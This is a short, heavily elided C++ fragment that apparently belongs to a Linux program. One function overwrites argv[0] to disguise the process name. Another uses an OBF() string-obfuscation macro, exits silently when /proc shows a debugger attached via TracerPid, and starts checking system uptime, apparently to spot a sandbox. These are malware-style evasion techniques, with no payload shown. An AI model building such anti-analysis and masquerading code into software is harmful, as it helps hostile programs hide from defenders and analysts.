...
namespace {
    ...
    void ScrubArgv(int argc, char** argv, const char* newName) {
        ...
        memset(argv[0], 0, len); strncpy(argv[0], newName, len - 1);
    ...
    void AntiAnalysis() {
        ...
        if (f) {
            ...
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, OBF("TracerPid:").c_str()) && !strstr(line, "\t0")) { fclose(f); _exit(0); }
            }
            fclose(f);
        }
        double uptime = 0; f = fopen(OBF("/proc/uptime").c_str(), "r");
